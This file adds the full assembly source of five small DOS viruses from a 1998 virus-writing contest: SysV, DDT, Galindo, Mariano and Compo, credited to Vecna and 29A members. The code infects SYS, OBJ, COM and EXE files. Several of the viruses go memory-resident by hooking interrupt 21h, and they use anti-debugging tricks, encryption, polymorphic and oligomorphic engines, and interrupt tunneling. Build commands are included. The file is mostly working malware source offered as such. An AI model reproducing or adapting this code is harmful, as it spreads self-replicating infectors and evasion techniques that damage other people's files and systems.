@@ -1,0 +1,581 @@
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[sysv.asm]ÄÄ
+;[SysV] Resident SYS infector
+;Copyright 1998 (c) Vecna
+;
+;This tiny virus, written to CyberYoda 150 bytes virus contest, is a resident
+;SYS infector. It infect all SYS files closed(this mean copyed too). It use
+;interruption substitution as a effective antidebugging trick against real
+;mode debuggers, and goes resident in the IVT.
+;
+;At load, the infected SYS jump to the virus installer, that check for a copy
+;already resident. If so, we return to the host, else we copy ourself to the
+;IVT at 0x20:0, hook interrupt 0x21, saving the original vector to interrupt
+;0x3.
+;
+;Each time a file is being closed, the virus infection routine activate. If
+;the handle is above 5, we seek the start of file and read 16 bytes. Then,
+;before we check if it is really a SYS file, we change the address of the
+;interrupt routine, making it point to the end of the file. The check for
+;a SYS file is then made. If isnt, we abort infection before any got changed.
+;Else, we write the modificated header, and the virus body to the end of the
+;file.
+;
+;Due the restriction of one virus by people, this virus dont taked part in the
+;contest. The virus I presented was DDT, that got the 4th place.
+
+.model tiny
+.code
+.386
+org 0
+
+VStart:
+       push 1234h
+     org $-2
+Host   dw 0					; push old code begin
+       push es
+       push ds
+       mov ax, -1
+       int 21h					; check previous residency
+       inc al
+       jz Return
+       call $+3
+       pop si
+       sub si, offset $-1			; get delta
+       sub di, di
+       push 20h
+       pop es
+       mov cl, LOW (offset VEnd-offset VStart)
+       rep movsb				; zopy ourself to 20:0
+       push 0
+       pop ds
+       mov ax, word ptr ds:[21h*4]
+       mov word ptr ds:[3h*4], ax		; hook int 21
+       mov ax, word ptr ds:[21h*4+2]
+       mov word ptr ds:[3h*4+2], ax
+       mov word ptr ds:[21h*4], offset int21
+       mov word ptr ds:[21h*4+2], 20h
+Return:
+       pop ds
+       pop es
+       ret					; return to SYS host
+
+int21:
+       cmp ah, 3eh
+       je InfectSYS				; If closing file, infect
+CheckMe:
+       cmp ax, -1				; If not our function, exec
+       je Me					; real int21
+NotMe:
+       int 3h
+Me:
+       retf 2
+
+InfectSYS:
+       pusha
+       push ds
+       push es
+       cmp bx, 5
+       jb NotSYS				; handle too low?
+Infect:
+       call SeekEOF				; get host size
+       mov bp, ax				; save it in BP
+       call SeekBOF
+       push cs
+       pop ds
+       mov ah, 3fh
+       mov cl, 16
+       mov dl, LOW (offset buffer)
+       push dx
+       push cx
+       mov si, dx
+       int 3h					; read SYS header
+       xchg bp, word ptr ds:[si+6]
+       mov word ptr ds:[Host], bp		; change INT routine to point
+       call SeekBOF				; to virus
+       mov ah, 40h
+       pop cx
+       pop dx
+       cmp word ptr ds:[si], -1 		; Hey, is a SYS? (we not checked
+       jne NotSYS				; this before ;)
+       int 3h					; save modificated header
+       call SeekEOF
+       mov ah, 40h
+       mov cx, offset VEnd-offset VStart
+       int 3h					; write virus code to EOF
+NotSYS:
+       pop es
+       pop ds
+       popa
+       jmp NotMe				; continue the file close
+
+SeekEOF:
+       mov ax, 4202h
+       jmp $+5					; skip the mov...
+SeekBOF:
+       mov ax, 4200h
+       sub cx, cx
+       cwd
+       int 3h
+       ret
+
+VEnd   equ this byte
+
+buffer equ this byte
+
+End VStart
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[sysv.asm]ÄÄ
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[ddt.asm]ÄÄ
+;[DDT] Overwriting encripted OBJ infector
+;Copyright 1998 (c) Vecna
+;
+;It search for LEDATA section and if it is bigger than the virus size(150),
+;and the loading adress is 0x100(COM file), the start of the code is
+;overwrited by a encripted copy of the virus.
+;
+;This virus won the 4th place in CyberYoda Contest, passed only by 3 otherz
+;29A virus, namely Combo, Mariano and Win95.HonkKong.
+
+.model tiny
+.code
+.startup
+
+vstart:
+	mov di, offset estart		       ; set the destination of the
+enc:					       ; unencripted virus
+	mov si, offset estart		       ; set the source
+	mov cl, LOW (offset vend - offset estart)
+eloop:
+	lodsb				       ; get byte
+	xor al, 00			       ; encript/decript
+evalue	equ byte ptr $-1
+	stosb
+	loop eloop			       ; do next byte
+	nop
+estart:
+	in al, 40h
+	mov byte ptr [evalue], al	       ; set new encription value
+	mov si, 100h
+	mov cx, offset estart-offset vstart    ; copy the decriptor to viral
+	rep movsb			       ; buffer
+	mov byte ptr [estart-1], 00
+      org $-1				       ; change the NOP by a RET
+	ret
+	call enc			       ; encript virus copy to viral
+search: 				       ; buffer (DI point to end of
+	mov ah, 4eh			       ; encriptor in viral buffer)
+	mov cl, 27h
+	mov dx, offset objmask		       ; search by *.OBJ
+fnext:
+	int 21h
+	jc dos				       ; exit if not OBJ found
+	mov ax, 3d02h
+	mov dx, 009eh
+	int 21h
+	xchg ax, bx
+nextsec:
+	call read3			       ; read info field of OBJ
+	jc close
+	cmp al, 8ah			       ; ending field
+	jz close
+	cmp al, 0a0h			       ; LEDATA section??
+	jz infect
+skip:
+	mov ax, 4201h
+	xor cx, cx
+	int 21h 			       ; go to next section
+	jmp nextsec
+close:
+	mov ah, 3eh
+	int 21h 			       ; close this file
+	mov ah, 4fh			       ; and search next
+	jmp fnext
+dos:
+	mov ah, 4ch
+	int 21h 			       ; exit to DOS
+infect:
+	cmp dx, offset vend - offset vstart
+	jbe skip			       ; section too small?
+	sub dx, 3
+	push dx 			       ; sub 3 from dx, because we
+	call read3			       ; will read more 3 bytes
+	jc close
+	cmp dx, 0100h			       ; loading adress is 0x100???
+	pop dx
+	jnz nocom			       ; this OBJ will not be COM...
+	mov cl, LOW (offset vend - offset vstart)
+	sub dx, cx			       ; calculate how much we already
+	push dx 			       ; moved the file pointer
+	mov ah, 40h
+	mov dx, offset vcopy		       ; write encripted copy
+	int 21h
+	pop dx
+nocom:
+	jmp skip			       ; do next section
+
+objmask db '*.obj', 0                          ; OBJ file mask
+
+read3:
+	mov ah, 3fh
+	mov cl, 3h
+	mov dx, offset buffer		       ; read 3 bytes
+	int 21h
+	mov al, byte ptr ds:[buffer]	       ; set AL to first byte
+	mov dx, word ptr ds:[buffer+1]	       ; and DX to the word after
+	ret
+
+vend equ this byte
+
+vcopy  db offset vend - offset vstart+10h dup(?)
+
+buffer equ this byte
+
+end
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[ddt.asm]ÄÄ
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[galindo.asm]ÄÄ
+
+      ;==============================;
+      ;        GALINDO virus	     ;
+      ;==============================;
+      ;      Made by Super/29A	     ;
+      ;==============================;
+
+; This is a spawning resident COM & EXE infector.
+; Galindo's length = 72 bytes !!!
+; wow!
+
+; Greetings to: 29A and all virii writers.
+; Special thanks to DARKMAN, MRSANDMAN & SLUG for their colaboration
+;
+; Compile with:
+;	TASM /m29A galindo.asm
+;	TLINK /t galindo.obj
+
+
+;--------------------------------------------------------------------------
+    .model tiny  ;yep! very very tiny!!!
+    .code
+    .386  ;so as to fuck 8086 users   X=D
+    org 100h
+
+vir_start:
+;===================================================================
+    pop es ; es=0000
+    scasw ; di=0000
+    lds bx,[di+0ah] ; points after a "ah=4b/int21"
+    mov [bx-1],al ;change "int21" to "int00"
+    mov al,10h ; (ax  was zero)
+    stosw      ;
+    add ax,dx  ; set int00 ---> (cs+0010h):(offset infect-0100h)
+    stosw      ;
+    int 27h ; stay resident (dx = ds = es  in most dos versions)
+infect:
+    lea di,[bx+40h] ; es:di = ds:bx+40 = command.com stack
+    mov si,dx ; ds:si = ds:dx
+    pusha   ; save regs
+    push ds ;
+    push di
+copy_filename:
+    cmp byte ptr [si],'.' ;
+    movsb		  ; store filename
+    jnz copy_filename	  ;
+    mov dword ptr [si],004d4f43h ; add extension COM
+    mov ax,5845h ;
+    stosw	 ; add extension EXE
+    cbw 	 ;
+    stosw	 ;
+    pop di
+    mov ah,56h ; rename to EXE
+    int 21h    ;
+    mov ah,3ch	 ; create virus  :=)
+    mov cx,3e00h ;
+    int 21h	 ;
+    push cs	    ;
+    pop ds	    ;
+    mov bh,40h	    ;
+    xchg bx,ax	    ; write virus  :)
+    cwd 	    ;  (writes 3e00h bytes)
+    int 21h	    ;
+    int 21h    ; close file
+	       ; (ax equals 3e00h)
+    pop ds ;
+    popa   ; load regs
+    mov dx,di ; ds:dx = ds:bx+40 = filename.exe
+    int 21h   ; execute host
+    iret ; return control to command.com
+;===================================================================
+end vir_start
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[galindo.asm]ÄÄ
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[mariano.asm]ÄÄ
+
+      ;==============================;
+      ;        MARIANO virus	     ;
+      ;==============================;
+      ;      Made by Super/29A	     ;
+      ;==============================;
+
+; This is a polymorphic resident COM & EXE companion
+; Mariano's length = 147 bytes !!!
+; wow!
+;
+; This virus is dedicated to Mariano Mariano
+;
+; Greetings to: 29A and all virii writers.
+;
+; Compile with:
+;	TASM /m29A mariano.asm
+;	TLINK /t mariano.obj
+
+
+;--------------------------------------------------------------------------
+    .model tiny  ;yep! very very tiny!!!
+    .code
+    .386  ;so as to fuck 8086 users   X=D
+    org 100h
+
+vir_start:
+;===================================================================
+    call entry_point
+
+hook:
+    pusha ; save regs
+
+    mov si,dx ; ds:si = ds:dx
+    lea dx,[bx+40h] ; ds:dx = ds:bx+40 = command.com stack
+    mov di,dx ; es:di = ds:bx+40
+    push si
+copy_filename:
+    cmp byte ptr [si],'.' ;
+    movsb		  ; store filename
+    jnz copy_filename	  ;
+    mov dword ptr [di],004d4f43h ; add extension COM
+    mov dword ptr [si],00455845h ; add extension EXE
+    pop di
+    mov ah,56h ; rename to EXE
+    int 21h    ;
+    mov ah,3ch	 ; create virus  :=)
+    mov cl,1	 ; (read-only attribute)
+    int 21h	 ;
+    xchg bx,ax	 ;
+
+
+;------------> here starts poly engine <------------;
+
+    call get_delta
+get_delta:
+    pop si
+    sub si,(offset get_delta-offset vir_start)
+    mov di,dx	  ;buffer to encrypt the virus
+    mov bp,10bh   ;memory displacement of XOR instruction
+    call garbage  ;insert some garbage
+    and cl,ah	  ;cl=00 or 01	meaning SI or DI , the index reg
+    mov al,0beh   ;MOV index_reg,xxxx
+    xor al,cl	  ;adjust the chosen index reg
+    stosb	  ;store MOV opcode
+    in ax,40h
+    stosw	  ;store random value
+    sub bp,ax	  ;adjust memory displacement
+    call garbage  ;insert more garbage
+    mov ax,0b480h ;XOR BYTE PTR [index_reg+random_displacement],random_byte
+    xor ah,cl	;adjust chosen index reg
+    stosw	;store XOR opcode
+    xchg bp,ax
+    stosw	;store memory displacement
+    mov eax,0f8794600h
+    or ah,cl ;choose INC SI or INC DI
+    in al,40h ;choose random key
+    stosd ;store: random_byte, INC, JNS
+    mov cx,vir_length
+decrypt:
+    movs byte ptr es:[di],cs:[si] ;copy byte to buffer
+    xor byte ptr [di-1],al ;encrypt byte
+    loop decrypt
+
+;-------------> here ends poly engine <-------------;
+
+
+    sub di,dx	    ;
+    mov cx,di	    ;
+    mov ah,40h	    ; write virus  :)
+    int 21h	    ;
+
+    mov ah,3eh ;
+    int 21h    ; close file
+
+    popa ; load regs
+    int 21h ; execute host
+    iret ; return control to command.com
+
+garbage proc
+    inc bp ;adjust memory displacement where to start decryption
+    inc bp ;because the garbage instruction is 2 byte long
+    in ax,40h
+    and al,111b ;
+    or al,0b0h	; select a MOV reg_8bits,random_byte
+    stosw ;store it
+    jp garbage ;more garbage? yes please
+    ret
+garbage endp
+
+
+entry_point:
+    mov ax,2503h	;
+    pop dx		; set int3 interrupt vector
+    int 21h		;
+    les di,[di+2+0ah] ; points after a "ah=4b/int21"
+    dec di ;
+    stosb  ; transform "int21" into "int03"
+    inc dh  ;
+    int 27h ; stay resident
+
+;===================================================================
+vir_length equ $-offset vir_start
+end vir_start
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[mariano.asm]ÄÄ
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[compo.asm]ÄÄ
+comment *
+				 Compo		       ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
+				Code by 	       ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
+			      Darkman/29A		ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
+						       ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
+						       ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ
+
+  Compo is a 145 bytes parasitic direct action new executable EXE virus.
+  Infects every file in current directory, when executed, by overwriting a
+  known area of constant bytes with the virus. Compo uses tunneling of
+  interrupt 21h and is oligomorphic in file.
+
+  I would like to thank Grog for the idea to this virus and Neurobasher for
+  the idea to the tunneling of interrupt 21h.
+
+  To compile Compo with Turbo Assembler v 4.0 type:
+    TASM /M COMPO.ASM
+    TLINK /x COMPO.OBJ
+*
+
+.model tiny
+.code
+
+code_begin:
+	     push    cs 		 ; Save CS at stack
+	     pop     ds 		 ; Load DS from stack (CS)
+
+	     mov     ax,4c00h		 ; Terminate with return code
+
+	     jmp     virus_begin
+
+	     db      59h dup(?)
+virus_begin:
+	     lea     di,crypt_begin	 ; DI = offset of crypt_begin
+	     push    di 		 ; Save DI at stack
+
+oligo_crypt  proc    near		 ; 8-bit ADD/SUB encryptor/decryptor
+	     mov     cx,(crypt_end-crypt_begin)
+crypt_loop:
+crypt_algo   equ     byte ptr $+01h	 ; 8-bit encryption/decryption algo...
+crypt_key    equ     byte ptr $+02h	 ; 8-bit encryption/decryption key
+	     add     byte ptr [di],00h	 ; 8-bit ADD/SUB encrypt/decrypt
+	     inc     di 		 ; Increase DI
+	     loop    crypt_loop
+
+	     ret			 ; Return!
+	     endp
+crypt_begin:
+	     cli			 ; Clear interrupt-enable flag
+	     xor     sp,sp		 ; Zero SP
+
+	     push    ax 		 ; Save AX at stack
+
+	     push    es 		 ; Save ES at stack
+	     mov     ah,52h		 ; Get list of lists
+	     int     21h
+	     mov     ax,es		 ; AX = DOS data segment
+	     pop     es 		 ; Load ES from stack
+
+	     cmp     ax,0a000h		 ; DOS data segment in Upper Memory...
+	     jb      virus_exit 	 ; Below? Jump to virus_exit
+
+	     mov     word ptr [int21_addr+02h],ax
+
+	     mov     ah,4eh		 ; Find first matching file
+	     lea     dx,file_specifi	 ; DX = offset of file_specifi
+find_next:
+	     call    int21_simula
+	     jnc     infect_file	 ; No error? Jump to infect_file
+virus_exit:
+	     pop     ax 		 ; Load AX from stack
+	     int     21h
+infect_file:
+	     push    es 		 ; Save ES at stack
+	     pop     ds 		 ; Load DS from stack (ES)
+
+	     mov     ax,3d02h		 ; Open file (read/write)
+	     mov     dl,9eh		 ; DX = offset of filename in Disk ...
+	     call    int21_simula
+	     xchg    ax,bx		 ; BX = file handle
+	     jc      find_next_ 	 ; Error? Jump to find_next_
+
+	     mov     ax,4200h		 ; Set current file position (SOF)
+	     xor     cx,cx		 ; Zero CX
+	     mov     dx,25eh		 ; CX:DX = offset from origin of ne...
+	     call    int21_simula
+
+	     push    cs 		 ; Save CS at stack
+	     pop     ds 		 ; Load DS from stack (CS)
+
+	     mov     ah,3fh		 ; Read from file
+	     mov     cl,02h		 ; Read two bytes
+	     mov     dl,low offset data_buffer
+	     call    int21_simula
+
+	     mov     di,dx		 ; DI = offset of data_buffer
+	     cmp     [di],0100110000000001b
+	     jne     close_file 	 ; Infectable new executable? Not ...?
+
+	     in      al,40h
+	     lea     si,virus_begin	 ; SI = offset of virus_begin
+	     mov     [si+(crypt_key-virus_begin)],al
+
+	     push    es 		 ; Save ES at stack
+	     push    cs 		 ; Save CS at stack
+	     pop     es 		 ; Load ES from stack (CS)
+
+	     cld			 ; Clear direction flag
+	     mov     cl,(code_end-virus_begin)
+	     rep     movsb		 ; Create a copy of the virus
+	     pop     es 		 ; Load ES from stack
+
+	     lea     di,data_buffer+(crypt_begin-virus_begin)
+	     call    oligo_crypt
+
+	     xor     byte ptr [si+(crypt_algo-virus_begin)],(00000101b xor 00101101b)
+
+	     mov     ah,40h		 ; Write to file
+	     mov     cl,(code_end-virus_begin)
+	     call    int21_simula
+close_file:
+	     mov     ah,3eh		 ; Close file
+	     call    int21_simula
+find_next_:
+	     mov     ah,4fh		 ; Find next matching file
+
+	     jmp     find_next
+
+int21_simula proc    near		 ; Simulate interrupt 21h
+	     pushf			 ; Save flags at stack
+
+	     db      10011010b		 ; CALL imm32 (opcode 9ah)
+int21_addr   dd      0000109eh		 ; Address of interrupt 21h
+
+	     ret			 ; Return!
+	     endp
+
+file_specifi db      '*.EXE'             ; File specification
+crypt_end:
+code_end:
+data_buffer  db      (code_end-virus_begin) dup(?)
+virus_name   db      '[Compo] '          ; Name of the virus
+virus_author db      '[Darkman/29A]'     ; Author of the virus
+data_end:
+
+end	     code_begin
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[compo.asm]ÄÄ
